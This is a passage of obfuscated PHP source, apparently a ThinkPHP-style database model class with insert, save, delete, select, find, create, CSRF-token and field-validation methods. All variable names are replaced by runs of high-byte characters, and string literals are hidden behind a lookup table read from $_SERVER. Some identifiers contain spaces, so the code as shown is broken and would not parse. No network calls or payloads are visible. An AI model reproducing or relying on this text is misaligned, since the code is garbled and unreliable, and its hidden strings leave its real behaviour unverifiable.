$this->db->insert($¨¯¼éºò, $É¶ ²›¡, $àüŸÊÕ¼); } $this->commit(); } if (!1 !== $üÔ”ô‘Ä) { $íÌ±ÔÏˆ = $this->getLastInsID(); if ($íÌ±ÔÏˆ) { return $íÌ±ÔÏˆ; } } return $üÔ”ô‘Ä; } public function selectAdd($§Ÿ¦ò‰¾ = '', $¸íóÉ® = '', $ŸçÉ‹ûè = array()) { $Ä£¸è¦¶ =& $_SERVER[ÏÒ Ì„]; $ŸçÉ‹ûè = $this->_parseOptions($ŸçÉ‹ûè); if (!1 === ($çñıê¸Î = $this->db->selectInsert($§Ÿ¦ò‰¾ ? $§Ÿ¦ò‰¾ : $ŸçÉ‹ûè[$Ä£¸è¦¶[271]], $¸íóÉ® ? $¸íóÉ® : $this->getTableName(), $ŸçÉ‹ûè))) { $this->error = think_lang($Ä£¸è¦¶[272]); return !1; } else { return $çñıê¸Î; } } public function save($ÒÓÎ¢ŒĞ = '', $Ø™´íÈÇ = array()) { $’¢ã•’ =& $_SERVER[ÏÒ Ì„]; if (empty($ÒÓÎ¢ŒĞ)) { if (!empty($this->data)) { $ÒÓÎ¢ŒĞ = $this->data; $this->data = array(); } else { $this->error = think_lang($’¢ã•’[269]); return !1; } } $ÒÓÎ¢ŒĞ = $this->_facade($ÒÓÎ¢ŒĞ); $Ø™´íÈÇ = $this->_parseOptions($Ø™´íÈÇ); $¿×¯Áùä = $this->getPk(); if (!isset($Ø™´íÈÇ[$’¢ã•’[273]])) { if (isset($ÒÓÎ¢ŒĞ[$¿×¯Áùä])) { $ÚŞ±•Õ¸[$¿×¯Áùä] = $ÒÓÎ¢ŒĞ[$¿×¯Áùä]; $Ø™´íÈÇ[$’¢ã•’[273]] = $ÚŞ±•Õ¸; unset($ÒÓÎ¢ŒĞ[$¿×¯Áùä]); } else { $this->error = think_lang($’¢ã•’[272]); return !1; } } if (is_array($Ø™´íÈÇ[$’¢ã•’[273]]) && isset($Ø™´íÈÇ[$’¢ã•’[273]][$¿×¯Áùä])) { $ı¬Ë©µß = $Ø™´íÈÇ[$’¢ã•’[273]][$¿×¯Áùä]; } if (!1 === $this->_beforeUpdate($ÒÓÎ¢ŒĞ, $Ø™´íÈÇ)) { return !1; } $”ŸÁèÅ® = $this->db->update($ÒÓÎ¢ŒĞ, $Ø™´íÈÇ); if (!1 !== $”ŸÁèÅ®) { if (isset($ı¬Ë©µß)) { $ÒÓÎ¢ŒĞ[$¿×¯Áùä] = $ı¬Ë©µß; } $this->_afterUpdate($ÒÓÎ¢ŒĞ, $Ø™´íÈÇ); } return $”ŸÁèÅ®; } protected function _beforeUpdate(&$ÃÍ¡Š‹á, $´¯“´É¬) { } protected function _afterUpdate($×âŠñÏµ, $ˆ¥×ßÈ¶) { } public function delete($Ñ‚æ¶ç€ = array()) { $¾ğíé³½ =& $_SERVER[ÏÒ Ì„]; if (empty($Ñ‚æ¶ç€) && empty($this->options[$¾ğíé³½[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Åì°Ôàš = $this->getPk(); if (is_numeric($Ñ‚æ¶ç€) || is_string($Ñ‚æ¶ç€)) { if (strpos($Ñ‚æ¶ç€, $¾ğíé³½[47])) { $˜ëÃÚæÜ[$Åì°Ôàš] = array($¾ğíé³½[274], $Ñ‚æ¶ç€); } else { $˜ëÃÚæÜ[$Åì°Ôàš] = $Ñ‚æ¶ç€; } $this->options[$¾ğíé³½[273]] = $˜ëÃÚæÜ; } $Ñ‚æ¶ç€ = $this->_parseOptions(); if (is_array($Ñ‚æ¶ç€[$¾ğíé³½[273]]) && isset($Ñ‚æ¶ç€[$¾ğíé³½[273]][$Åì°Ôàš])) { $„ØÏ¥» = $Ñ‚æ¶ç€[$¾ğíé³½[273]][$Åì°Ôàš]; } $¯ø¹’ƒ­ = $this->db->delete($Ñ‚æ¶ç€); if (!1 !== $¯ø¹’ƒ­) { $²ıÔî¢í = array(); if (isset($„ØÏ¥»)) { $²ıÔî¢í[$Åì°Ôàš] = $„ØÏ¥»; } $this->_after_delete($²ıÔî¢í, $Ñ‚æ¶ç€); } return $¯ø¹’ƒ­; } protected function _after_delete($Â£’‚–Û, $ŠÑÔĞô) { } public function select($´ü±¸ø© = array()) { $åâãŞ¨Ù =& $_SERVER[ÏÒ Ì„]; if (is_string($´ü±¸ø©) || is_numeric($´ü±¸ø©)) { $ùœ•á’“ = $this->getPk(); if (strpos($´ü±¸ø©, $åâãŞ¨Ù[47])) { $òÅóçÄû[$ùœ•á’“] = array($åâãŞ¨Ù[274], $´ü±¸ø©); } else { $òÅóçÄû[$ùœ•á’“] = $´ü±¸ø©; } $this->options[$åâãŞ¨Ù[273]] = $òÅóçÄû; } elseif (!1 === $´ü±¸ø©) { $´ü±¸ø© = $this->_parseOptions(); return $åâãŞ¨Ù[275] . $this->db->buildSelectSql($´ü±¸ø©) . $åâãŞ¨Ù[276]; } $´ü±¸ø© = $this->_parseOptions(); $ŒÌ €º = $this->db->select($´ü±¸ø©); if (!1 === $ŒÌ €º) { return !1; } if (empty($ŒÌ €º)) { return null; } $this->_afterSelect($ŒÌ €º, $´ü±¸ø©); return $ŒÌ €º; } protected function _afterSelect(&$¬ãæÍ©¾, $Ö¼Æô) { } public function buildSql($ºÎ¸ø™­ = array()) { $íğ™ÊË =& $_SERVER[ÏÒ Ì„]; $ºÎ¸ø™­ = $this->_parseOptions($ºÎ¸ø™­); return $íğ™ÊË[275] . $this->db->buildSelectSql($ºÎ¸ø™­) . $íğ™ÊË[276]; } public function optionsValue($¸Ï²Ñêæ = null) { if (is_null($¸Ï²Ñêæ)) { return $this->options; } elseif (is_array($¸Ï²Ñêæ)) { $this->options = array_merge($this->options, $¸Ï²Ñêæ); } } protected function _parseOptions($­‡áà•Ú = array()) { $ñ”¦Îì˜ =& $_SERVER[ÏÒ Ì„]; if (is_array($­‡áà•Ú)) { $­‡áà•Ú = array_merge($this->options, $­‡áà•Ú); } $this->options = array(); if (!isset($­‡áà•Ú[$ñ”¦Îì˜[277]])) { $­‡áà•Ú[$ñ”¦Îì˜[277]] = $this->getTableName(); $“ûÌĞÁ© = $this->fields; } else { $“ûÌĞÁ© = $this->getDbFields(); } if (!empty($­‡áà•Ú[$ñ”¦Îì˜[278]])) { $­‡áà•Ú[$ñ”¦Îì˜[277]] .= $ñ”¦Îì˜[50] . $­‡áà•Ú[$ñ”¦Îì˜[278]]; } $­‡áà•Ú[$ñ”¦Îì˜[279]] = $this->name; if (isset($­‡áà•Ú[$ñ”¦Îì˜[273]]) && is_array($­‡áà•Ú[$ñ”¦Îì˜[273]]) && !empty($“ûÌĞÁ©) && !isset($­‡áà•Ú[$ñ”¦Îì˜[280]]) && !isset($­‡áà•Ú[$ñ”¦Îì˜[277]])) { foreach ($­‡áà•Ú[$ñ”¦Îì˜[273]] as $÷óÇÉ­ä => $ŠÔÕ¼Ç÷) { $÷óÇÉ­ä = trim($÷óÇÉ­ä); if (in_array($÷óÇÉ­ä, $“ûÌĞÁ©, !0)) { if (is_scalar($ŠÔÕ¼Ç÷)) { $this->_parseType($­‡áà•Ú[$ñ”¦Îì˜[273]], $÷óÇÉ­ä); } } elseif (!is_numeric($÷óÇÉ­ä) && $ñ”¦Îì˜[71] != substr($÷óÇÉ­ä, 0, 1) && !1 === strpos($÷óÇÉ­ä, $ñ”¦Îì˜[95]) && !1 === strpos($÷óÇÉ­ä, $ñ”¦Îì˜[258]) && !1 === strpos($÷óÇÉ­ä, $ñ”¦Îì˜[281]) && !1 === strpos($÷óÇÉ­ä, $ñ”¦Îì˜[282])) { unset($­‡áà•Ú[$ñ”¦Îì˜[273]][$÷óÇÉ­ä]); } } } $this->_options_filter($­‡áà•Ú); return $­‡áà•Ú; } protected function _options_filter(&$ ×˜øÄŞ) { } protected function _parseType(&$Ÿ¤çåº, $µÉƒ¨¸©) { $ĞñÏß =& $_SERVER[ÏÒ Ì„]; if (empty($this->options[$ĞñÏß[283]][$ĞñÏß[4] . $µÉƒ¨¸©])) { $Ò™àÙÁĞ = strtolower($this->fields[$ĞñÏß[250]][$µÉƒ¨¸©]); if (!1 !== strpos($Ò™àÙÁĞ, $ĞñÏß[284])) { } elseif (!1 === strpos($Ò™àÙÁĞ, $ĞñÏß[285]) && !1 !== strpos($Ò™àÙÁĞ, $ĞñÏß[286])) { $Ÿ¤çåº[$µÉƒ¨¸©] = intval($Ÿ¤çåº[$µÉƒ¨¸©]); } elseif (!1 !== strpos($Ò™àÙÁĞ, $ĞñÏß[287]) || !1 !== strpos($Ò™àÙÁĞ, $ĞñÏß[288])) { $Ÿ¤çåº[$µÉƒ¨¸©] = floatval($Ÿ¤çåº[$µÉƒ¨¸©]); } elseif (!1 !== strpos($Ò™àÙÁĞ, $ĞñÏß[289])) { $Ÿ¤çåº[$µÉƒ¨¸©] = (bool) $Ÿ¤çåº[$µÉƒ¨¸©]; } } } public function find($µ•ûé† = array()) { $‰ä€•Ô² =& $_SERVER[ÏÒ Ì„]; if (is_numeric($µ•ûé†) || is_string($µ•ûé†)) { $ÛĞâ‘Õï[$this->getPk()] = intval($µ•ûé†); $this->options[$‰ä€•Ô²[273]] = $ÛĞâ‘Õï; } $this->options[$‰ä€•Ô²[290]] = 1; $µ•ûé† = $this->_parseOptions(); $Êµ³üøÀ = $this->db->select($µ•ûé†); if (!1 === $Êµ³üøÀ) { return !1; } if (empty($Êµ³üøÀ)) { return null; } $this->data = $Êµ³üøÀ[0]; $this->_afterFind($this->data, $µ•ûé†); if (!empty($this->options[$‰ä€•Ô²[291]])) { return $this->returnResult($this->data, $this->options[$‰ä€•Ô²[291]]); } return $this->data; } protected function _afterFind(&$îì”—¦‘, $ÆªÎÓ–Å) { } protected function returnResult($†‰îËÍò, $˜œŸ“Éœ = '') { $ã¢æîÕ‘ =& $_SERVER[ÏÒ Ì„]; if ($˜œŸ“Éœ) { if (is_callable($˜œŸ“Éœ)) { return call_user_func($˜œŸ“Éœ, $†‰îËÍò); } switch (strtolower($˜œŸ“Éœ)) { case $ã¢æîÕ‘[292]: return json_encode($†‰îËÍò); case $ã¢æîÕ‘[293]: return xml_encode($†‰îËÍò); } } return $†‰îËÍò; } public function parseFieldsMap($„ç’¾¤, $„ŠˆœÖ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $âöÀú¸ü => $µëÓ¾”ğ) { if ($„ŠˆœÖ == 1) { if (isset($„ç’¾¤[$µëÓ¾”ğ])) { $„ç’¾¤[$âöÀú¸ü] = $„ç’¾¤[$µëÓ¾”ğ]; unset($„ç’¾¤[$µëÓ¾”ğ]); } } else { if (isset($„ç’¾¤[$âöÀú¸ü])) { $„ç’¾¤[$µëÓ¾”ğ] = $„ç’¾¤[$âöÀú¸ü]; unset($„ç’¾¤[$âöÀú¸ü]); } } } } return $„ç’¾¤; } public function setField($ÈàÈÚıì, $¯ôŒ¡‚ß = '') { if (is_array($ÈàÈÚıì)) { $¬´ã­‡î = $ÈàÈÚıì; } else { $¬´ã­‡î[$ÈàÈÚıì] = $¯ôŒ¡‚ß; } return $this->save($¬´ã­‡î); } public function setAdd($î±çò¥ , $èª±©«Š = 1) { $¡’­Ğ­… =& $_SERVER[ÏÒ Ì„]; $ÇÌŠ•Ô = $î±çò¥  . $¡’­Ğ­…[294] . $èª±©«Š; if ($èª±©«Š < 0) { $ÇÌŠ•Ô = $î±çò¥  . $èª±©«Š; } return $this->setField($î±çò¥ , array($¡’­Ğ­…[295], $ÇÌŠ•Ô)); } public function getField($¦Ğ“Î«”, $—åØÛã” = null) { $™­›ã½ =& $_SERVER[ÏÒ Ì„]; $ˆŒè­è½[$™­›ã½[271]] = $¦Ğ“Î«”; $ˆŒè­è½ = $this->_parseOptions($ˆŒè­è½); $¦Ğ“Î«” = trim($¦Ğ“Î«”); if (strpos($¦Ğ“Î«”, $™­›ã½[47])) { if (!isset($ˆŒè­è½[$™­›ã½[290]])) { $ˆŒè­è½[$™­›ã½[290]] = is_numeric($—åØÛã”) ? $—åØÛã” : $™­›ã½[33]; } $¾œØ©Ê = $this->db->select($ˆŒè­è½); if (!empty($¾œØ©Ê)) { $–·éïåì = explode($™­›ã½[47], $¦Ğ“Î«”); $¦Ğ“Î«” = array_keys($¾œØ©Ê[0]); $ÊÑ”õ¾® = array_shift($¦Ğ“Î«”); $Ê—‘Ü¤´ = array_shift($¦Ğ“Î«”); $¬ê„Ù¹× = array(); $¤úº¼ÆÛ = count($–·éïåì); foreach ($¾œØ©Ê as $„›¹ªØ) { $¨Ø½Ã—Ì = $„›¹ªØ[$ÊÑ”õ¾®]; if (2 == $¤úº¼ÆÛ) { $¬ê„Ù¹×[$¨Ø½Ã—Ì] = $„›¹ªØ[$Ê—‘Ü¤´]; } else { $¬ê„Ù¹×[$¨Ø½Ã—Ì] = is_string($—åØÛã”) ? implode($—åØÛã”, $„›¹ªØ) : $„›¹ªØ; } } return $¬ê„Ù¹×; } } else { if (!0 !== $—åØÛã”) { $ˆŒè­è½[$™­›ã½[290]] = is_numeric($—åØÛã”) ? $—åØÛã” : 1; } if ($—åØÛã” === $™­›ã½[253]) { unset($ˆŒè­è½[$™­›ã½[290]]); } $„›¹ªØ = $this->db->select($ˆŒè­è½); if (!empty($„›¹ªØ)) { if ($—åØÛã” === $™­›ã½[253]) { return reset($„›¹ªØ[0]); } if (!0 !== $—åØÛã” && 1 == $ˆŒè­è½[$™­›ã½[290]]) { return reset($„›¹ªØ[0]); } foreach ($„›¹ªØ as $•‘¦Š) { $¦ã©Ë½»[] = $•‘¦Š[$¦Ğ“Î«”]; } return $¦ã©Ë½»; } } return null; } public function create($ÆÔ‡Ã‚ = '', $Õãı†é¯ = '') { $¤¾üØ¼¯ =& $_SERVER[ÏÒ Ì„]; if (empty($ÆÔ‡Ã‚)) { $ÆÔ‡Ã‚ = $_POST; } elseif (is_object($ÆÔ‡Ã‚)) { $ÆÔ‡Ã‚ = get_object_vars($ÆÔ‡Ã‚); } if (empty($ÆÔ‡Ã‚) || !is_array($ÆÔ‡Ã‚)) { $this->error = think_lang($¤¾üØ¼¯[269]); return !1; } $ÆÔ‡Ã‚ = $this->parseFieldsMap($ÆÔ‡Ã‚, 0); $Õãı†é¯ = $Õãı†é¯ ? $Õãı†é¯ : (!empty($ÆÔ‡Ã‚[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¤¾üØ¼¯[271]])) { $ßÅóÃ§Ø = $this->options[$¤¾üØ¼¯[271]]; unset($this->options[$¤¾üØ¼¯[271]]); } elseif ($Õãı†é¯ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ßÅóÃ§Ø = $this->insertFields; } elseif ($Õãı†é¯ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ßÅóÃ§Ø = $this->updateFields; } if (isset($ßÅóÃ§Ø)) { if (is_string($ßÅóÃ§Ø)) { $ßÅóÃ§Ø = explode($¤¾üØ¼¯[47], $ßÅóÃ§Ø); } if (think_config($¤¾üØ¼¯[296])) { $ßÅóÃ§Ø[] = think_config($¤¾üØ¼¯[297]); } foreach ($ÆÔ‡Ã‚ as $ƒÌ¾¶¶ => $ÀÚÙ­Éı) { if (!in_array($ƒÌ¾¶¶, $ßÅóÃ§Ø)) { unset($ÆÔ‡Ã‚[$ƒÌ¾¶¶]); } } } if (!$this->autoValidation($ÆÔ‡Ã‚, $Õãı†é¯)) { return !1; } if (!$this->autoCheckToken($ÆÔ‡Ã‚)) { $this->error = think_lang($¤¾üØ¼¯[298]); return !1; } if ($this->autoCheckFields) { $ßÅóÃ§Ø = $this->getDbFields(); foreach ($ÆÔ‡Ã‚ as $ƒÌ¾¶¶ => $ÀÚÙ­Éı) { if (!in_array($ƒÌ¾¶¶, $ßÅóÃ§Ø)) { unset($ÆÔ‡Ã‚[$ƒÌ¾¶¶]); } elseif (MAGIC_QUOTES_GPC && is_string($ÀÚÙ­Éı)) { $ÆÔ‡Ã‚[$ƒÌ¾¶¶] = stripslashes($ÀÚÙ­Éı); } } } $this->autoOperation($ÆÔ‡Ã‚, $Õãı†é¯); $this->data = $ÆÔ‡Ã‚; return $ÆÔ‡Ã‚; } public function autoCheckToken($ç¤¡Í†¸) { $İâÏ›ô· =& $_SERVER[ÏÒ Ì„]; if (isset($this->options[$İâÏ›ô·[299]]) && !$this->options[$İâÏ›ô·[299]]) { return !0; } if (think_config($İâÏ›ô·[296])) { $—×Û¼Æš = think_config($İâÏ›ô·[297]); if (!isset($ç¤¡Í†¸[$—×Û¼Æš]) || Session::get($—×Û¼Æš)) { return !1; } list($¶Ğ¾¤, $Âè×Ã§§) = explode($İâÏ›ô·[71], $ç¤¡Í†¸[$—×Û¼Æš]); if ($Âè×Ã§§ && Session::get($—×Û¼Æš . $İâÏ›ô·[95] . $¶Ğ¾¤) === $Âè×Ã§§) { Session::remove($—×Û¼Æš . $İâÏ›ô·[95] . $¶Ğ¾¤); return !0; } if (think_config($İâÏ›ô·[300])) { Session::remove($—×Û¼Æš . $İâÏ›ô·[95] . $¶Ğ¾¤); } return !1; } return !0; } public function regex($Ê™»»ñ, $èŒŠâ¥¯) { $‰ëÅç¶‰ =& $_SERVER[ÏÒ Ì„]; $æ›ö®ñá = array($‰ëÅç¶‰[301] => $‰ëÅç¶‰[302], $‰ëÅç¶‰[303] => $‰ëÅç¶‰[304], $‰ëÅç¶‰[305] => $‰ëÅç¶‰[306], $‰ëÅç¶‰[307] => $‰ëÅç¶‰[308], $‰ëÅç¶‰[309] => $‰ëÅç¶‰[310], $‰ëÅç¶‰[311] => $‰ëÅç¶‰[312], $‰ëÅç¶‰[313] => $‰ëÅç¶‰[314], $‰ëÅç¶‰[288] => $‰ëÅç¶‰[315], $‰ëÅç¶‰[316] => $‰ëÅç¶‰[317]); if (isset($æ›ö®ñá[strtolower($èŒŠâ¥¯)])) { $èŒŠâ¥¯ = $æ›ö®ñá[strtolower($èŒŠâ¥¯)]; } return preg_match($èŒŠâ¥¯, $Ê™»»ñ) === 1; } private function autoOperation(&$è†¶—à, $§›şí«‡) { $Í›ÅØŸ =& $_SERVER[ÏÒ Ì„]; if (!empty($this->options[$Í›ÅØŸ[318]])) { $Ú”Æ©¶· = $this->options[$Í›ÅØŸ[318]]; unset($this->options[$Í›ÅØŸ[318]]); } elseif (!empty($this->_auto)) { $Ú”Æ©¶· = $this->_auto; } if (isset($Ú”Æ©¶·)) { foreach ($Ú”Æ©¶· as $ÃûÕ»‚Ø) { if (empty($ÃûÕ»‚Ø[2])) { $ÃûÕ»‚Ø[2] = THINK_MODEL_INSERT; } if ($§›şí«‡ == $ÃûÕ»‚Ø[2] || $ÃûÕ»‚Ø[2] == THINK_MODEL_BOTH) { switch (trim($ÃûÕ»‚Ø[3])) { case $Í›ÅØŸ[319]: case $Í›ÅØŸ[320]: $ı˜¢šò¶ = isset($ÃûÕ»‚Ø[4]) ? (array) $ÃûÕ»‚Ø[4] : array(); if (isset($è†¶—à[$ÃûÕ»‚Ø[0]])) { array_unshift($ı˜¢šò¶, $è†¶—à[$ÃûÕ»‚Ø[0]]); } if ($Í›ÅØŸ[319] == $ÃûÕ»‚Ø[3]) { $è†¶—à[$ÃûÕ»‚Ø[0]] = call_user_func_array($ÃûÕ»‚Ø[1], $ı˜¢šò¶); } else { $è†¶—à[$ÃûÕ»‚Ø[0]] = call_user_func_array(array(&$this, $ÃûÕ»‚Ø[1]), $ı˜¢šò¶); } break; case $Í›ÅØŸ[271]: $è†¶—à[$ÃûÕ»‚Ø[0]] = $è†¶—à[$ÃûÕ»‚Ø[1]]; break; case $Í›ÅØŸ[321]: if ($Í›ÅØŸ[33] === $è†¶—à[$ÃûÕ»‚Ø[0]]) { unset($è†¶—à[$ÃûÕ»‚Ø[0]]); } break; case $Í›ÅØŸ[322]: default: $è†¶—à[$ÃûÕ»‚Ø[0]] = $ÃûÕ»‚Ø[1]; } if (!1 === $è†¶—à[$ÃûÕ»‚Ø[0]]) { unset($è†¶—à[$ÃûÕ»‚Ø[0]]); } } } } return $è†¶—à; } protected function autoValidation($ïŒš©ú, $®¨Ñß¾ë) { $¢¥Ä°óû =& $_SERVER[ÏÒ Ì„]; if (!empty($this->options[$¢¥Ä°óû[323]])) { $»£Ï´íÔ = $this->options[$¢¥Ä°óû[323]]; unset($this->options[$¢¥Ä°óû[323]]); } elseif (!empty($this->_validate)) { $»£Ï´íÔ = $this->_validate; } if (isset($»£Ï´íÔ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($»£Ï´íÔ as $±˜¢Ù©Î => $Ñ‰‚ÔŠ) { if (empty($Ñ‰‚ÔŠ[5]) || $Ñ‰‚ÔŠ[5] == THINK_MODEL_BOTH || $Ñ‰‚ÔŠ[5] == $®¨Ñß¾ë) { if (0 == strpos($Ñ‰‚ÔŠ[2], $¢¥Ä°óû[324]) && strpos($Ñ‰‚ÔŠ[2], $¢¥Ä°óû[325])) { $Ñ‰‚ÔŠ[2] = think_lang(substr($Ñ‰‚ÔŠ[2], 2, -1)); } $Ñ‰‚ÔŠ[3] = isset($Ñ‰‚ÔŠ[3]) ? $Ñ‰‚ÔŠ[3] : THINK_EXISTS_VALIDATE; $Ñ‰‚ÔŠ[4] = isset($Ñ‰‚ÔŠ[4]) ? $Ñ‰‚ÔŠ[4] : $¢¥Ä°óû[326]; switch ($Ñ‰‚ÔŠ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ïŒš©ú, $Ñ‰‚ÔŠ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¢¥Ä°óû[33] != trim($ïŒš©ú[$Ñ‰‚ÔŠ[0]])) { if (!1 === $this->_validationField($ïŒš©ú, $Ñ‰‚ÔŠ)) { return !1; } } break; default: if (isset($ïŒš©ú[$Ñ‰‚ÔŠ[0]])) { if (!1 === $this->_validationField($ïŒš©ú, $Ñ‰‚ÔŠ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ñ½–ËÙƒ, $»š¾ãßç) { if (!1 === $this->_validationFieldItem($ñ½–ËÙƒ, $»š¾ãßç)) { if ($this->patchValidate) { $this->error[$»š¾ãßç[0]] = $»š¾ãßç[2]; } else { $this->error = $»š¾ãßç[2]; return !1; } } return; } protected function _validationFieldItem($Óˆ÷šŸ, $¹ÖòÂğ) { $â‘áÁÎÑ =& $_SERVER[ÏÒ Ì„]; switch (strtolower(trim($¹ÖòÂğ[4]))) { case $â‘áÁÎÑ[319]: case $â‘áÁÎÑ[320]: $·×ñ¦µ = isset($¹ÖòÂğ[6]) ? (array) $¹ÖòÂğ[6] : array(); if (is_string($¹ÖòÂğ[0]) && strpos($¹ÖòÂğ[0], $â‘áÁÎÑ[47])) { $¹ÖòÂğ[0] = explode($â‘áÁÎÑ[47], $¹ÖòÂğ[0]); } if (is_array($¹ÖòÂğ[0])) { foreach ($¹ÖòÂğ[0] as $®µªÅ¥í) { $Ó¥ÅÇ÷Ù[$®µªÅ¥í] = $Óˆ÷šŸ[$®µªÅ¥í]; } array_unshift($·×ñ¦µ, $Ó¥ÅÇ÷Ù); } else { array_unshift($·×ñ¦µ, $Óˆ÷šŸ[$¹ÖòÂğ[0]]); } if ($â‘áÁÎÑ[319] == $¹ÖòÂğ[4]) { return call_user_func_array($¹ÖòÂğ[1], $·×ñ¦µ); } else { return call_user_func_array(array(&$this, $¹ÖòÂğ[1]), $·×ñ¦µ); } case $â‘áÁÎÑ[327]: return $Óˆ÷šŸ[$¹ÖòÂğ[0]] == $Óˆ÷šŸ[$¹ÖòÂğ[1]]; case $â‘áÁÎÑ[328]: if (is_string($¹ÖòÂğ[0]) && strpos($¹ÖòÂğ[0], $â‘áÁÎÑ[47])) { $¹ÖòÂğ[0] = explode($â‘áÁÎÑ[47], $¹ÖòÂğ[0]); } $¹¬İ„ö‚ = array(); if (is_array($¹ÖòÂğ[0])) { foreach ($¹ÖòÂğ[0] as $®µªÅ¥í) { $¹¬İ„ö‚[$®µªÅ¥í] = $Óˆ÷šŸ[$®µªÅ¥í]; } } else { $¹¬İ„ö‚[$¹ÖòÂğ[0]] = $Óˆ÷šŸ[$¹ÖòÂğ[0]]; } if (!empty($Óˆ÷šŸ[$this->getPk()])) { $¹¬İ„ö‚[$this->getPk()] = array($â‘áÁÎÑ[329], $Óˆ÷šŸ[$this->getPk()]); } if ($this->where($¹¬İ„ö‚)->find()) { return !1; } return !0; default: return $this->check($Óˆ÷šŸ[$¹ÖòÂğ[0]], $¹ÖòÂğ[1], $¹ÖòÂğ[4]); } } public function check($†¸ËÚËŞ, $ùİîÛà”, $Ëê¿Ö¦ = "\162\x65\147\145\x78") { $ã®´ˆ›é =& $_SERVER[ÏÒ Ì„]; $Ëê¿Ö¦ = strtolower(trim($Ëê¿Ö¦)); switch ($Ëê¿Ö¦) { case $ã®´ˆ›é[7]: case $ã®´ˆ›é[330]: $×ŠúŞÍè = is_array($ùİîÛà”) ? $ùİîÛà” : explode($ã®´ˆ›é[47], $ùİîÛà”); return $Ëê¿Ö¦ == $ã®´ˆ›é[7] ? in_array($†¸ËÚËŞ, $×ŠúŞÍè) : !in_array($†¸ËÚËŞ, $×ŠúŞÍè); case $ã®´ˆ›é[331]: case $ã®´ˆ›é[332]: if (is_array($ùİîÛà”)) { $®¡Ñöú = $ùİîÛà”[0]; $ÙıíÛ‡Ü = $ùİîÛà”[1]; } else { list($®¡Ñöú, $ÙıíÛ‡Ü) = explode($ã®´ˆ›é[47], $ùİîÛà”); } return $Ëê¿Ö¦ == $ã®´ˆ›é[331] ? $†¸ËÚËŞ >= $®¡Ñöú && $†¸ËÚËŞ <= $ÙıíÛ‡Ü : $†¸ËÚËŞ < $®¡Ñöú || $†¸ËÚËŞ > $ÙıíÛ‡Ü; case $ã®´ˆ›é[333]: case $ã®´ˆ›é[334]: return $Ëê¿Ö¦ == $ã®´ˆ›é[333] ? $†¸ËÚËŞ == $ùİîÛà” : $†¸ËÚËŞ != $ùİîÛà”; case $ã®´ˆ›é[335]: $Âêš¸äß = mb_strlen($†¸ËÚËŞ, $ã®´ˆ›é[336]); if (strpos($ùİîÛà”, $ã®´ˆ›é[47])) { list($®¡Ñöú, $ÙıíÛ‡Ü) = explode($ã®´ˆ›é[47], $ùİîÛà”); return $Âêš¸äß >= $®¡Ñöú && $Âêš¸äß <= $ÙıíÛ‡Ü; } else { return $Âêš¸äß == $ùİîÛà”; } case $ã®´ˆ›é[337]: list($ÌŠø¡², $âŸÄ‚£—) = explode($ã®´ˆ›é[47], $ùİîÛà”); if (!is_numeric($ÌŠø¡²)) { $ÌŠø¡² = strtotime($ÌŠø¡²); } if (!is_numeric($âŸÄ‚£—)) { $âŸÄ‚£— = strtotime($âŸÄ‚£—); } return NOW_TIME >= $ÌŠø¡² && NOW_TIME <= $âŸÄ‚£—; case $ã®´ˆ›é[338]: return in_array(get_client_ip(), explode($ã®´ˆ›é[47], $ùİîÛà”)); case $ã®´ˆ›é[339]: return !in_array(get_client_ip(), explode($ã®´ˆ›é[47], $ùİîÛà”)); case $ã®´ˆ›é[326]: default: return $this->regex($†¸ËÚËŞ, $ùİîÛà”); } } public function query($‰ïÍçœØ, $Ë¡Š‹¡ı = false) { $ İ¦óæş =& $_SERVER[ÏÒ Ì„]; if (!is_bool($Ë¡Š‹¡ı) && !is_array($Ë¡Š‹¡ı)) { $Ë¡Š‹¡ı = func_get_args(); array_shift($Ë¡Š‹¡ı); } $‰ïÍçœØ = str_replace(array($ İ¦óæş[229], $ İ¦óæş[340]), $ İ¦óæş[50], $‰ïÍçœØ); $‰ïÍçœØ = $this->parseSql($‰ïÍçœØ, $Ë¡Š‹¡ı); return $this->db->query($‰ïÍçœØ); } public function execute($ÔŸ¸ŞÎ, $Ñ„ôÄø = false) { if (!is_bool($Ñ„ôÄø) && !is_array($Ñ„ôÄø)) { $Ñ„ôÄø = func_get_args(); array_shift($Ñ„ôÄø); } $ÔŸ¸ŞÎ = $this->parseSql($ÔŸ¸ŞÎ, $Ñ„ôÄø); return $this->db->execute($ÔŸ¸ŞÎ); } protected function parseSql($ÃË„Ïòì, $ÛœÒÅ) { $ô½ò¯Š =& $_SERVER[ÏÒ Ì„]; if (!0 === $ÛœÒÅ) { $ë«Æ—Áà = $this->_parseOptions(); $ÃË„Ïòì = $this->db->parseSql($ÃË„Ïòì, $ë«Æ—Áà); } elseif (is_array($ÛœÒÅ)) { $ÛœÒÅ = array_map(array($this->db, $ô½ò¯Š[341]), $ÛœÒÅ); $ÃË„Ïòì = vsprintf($ÃË„Ïòì, $ÛœÒÅ); } else { $ÃË„Ïòì = strtr($ÃË„Ïòì, array($ô½ò¯Š[342] => $this->getTableName(), $ô½ò¯Š[343] => think_config($ô½ò¯Š[242]))); } $this->db->setModel($this->name); return $ÃË„Ïòì; } public function db($“‹ªõ´ú = '', $ª‡ÓêÅ› = '', $èä¬Ç‘ = array()) { $Æãõ¹“Ğ =& $_SERVER[ÏÒ Ì„]; if ($Æãõ¹“Ğ[33] === $“‹ªõ´ú && $this->db) { return $this->db; } static $ĞãäÆÙÈ = array(); static $¡‹Åñ¡• = array(); if (!isset($¡‹Åñ¡•[$“‹ªõ´ú]) || isset($¡‹Åñ¡•[$“‹ªõ´ú]) && $ª‡ÓêÅ› && $ĞãäÆÙÈ[$“‹ªõ´ú] != $ª‡ÓêÅ›) { if (!empty($ª‡ÓêÅ›) && is_string($ª‡ÓêÅ›) && !1 === strpos($ª‡ÓêÅ›, $Æãõ¹“Ğ[8])) { $ª‡ÓêÅ› = think_config($ª‡ÓêÅ›); } $“‹ªõ´ú = think_guid($ª‡ÓêÅ›); $¡‹Åñ¡•[$“‹ªõ´ú] = Db::getInstance($ª‡ÓêÅ›); } elseif 